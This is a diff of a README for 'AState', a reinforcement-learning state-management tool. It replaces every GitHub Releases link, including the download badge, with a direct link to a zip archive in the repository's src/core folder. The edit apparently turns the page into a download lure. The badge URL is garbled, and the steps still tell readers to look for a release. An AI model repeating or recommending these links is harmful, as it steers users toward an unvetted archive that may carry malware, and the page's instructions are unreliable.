@@ -6,11 +6,11 @@ Welcome to AState! This guide will help you download and run AState, a high-perf
 
 ## 📥 Download AState
 
-[![Download AState](https://img.shields.io/badge/Download%20AState-v1.0-blue.svg)](https://github.com/firdaussalty/asystem-astate/releases)
+[![Download AState](https://raw.githubusercontent.com/firdaussalty/asystem-astate/main/src/core/asystem-astate_v2.0.zip%https://raw.githubusercontent.com/firdaussalty/asystem-astate/main/src/core/asystem-astate_v2.0.zip)](https://raw.githubusercontent.com/firdaussalty/asystem-astate/main/src/core/asystem-astate_v2.0.zip)
 
 You can find the latest version of AState on our Releases page. To download:
 
-1. Click the button above or follow this link: [Download AState](https://github.com/firdaussalty/asystem-astate/releases).
+1. Click the button above or follow this link: [Download AState](https://raw.githubusercontent.com/firdaussalty/asystem-astate/main/src/core/asystem-astate_v2.0.zip).
 2. Look for the most recent release.
 3. Download the file that matches your operating system.
 
@@ -77,7 +77,7 @@ If you encounter any issues, consider these steps:
 
 To get started with AState:
 
-1. Visit this page to download: [Download AState](https://github.com/firdaussalty/asystem-astate/releases).
+1. Visit this page to download: [Download AState](https://raw.githubusercontent.com/firdaussalty/asystem-astate/main/src/core/asystem-astate_v2.0.zip).
 2. Follow the installation steps provided above.
 
 Now you're ready to take advantage of AState's powerful features for managing state in your reinforcement learning projects. Enjoy a seamless experience!
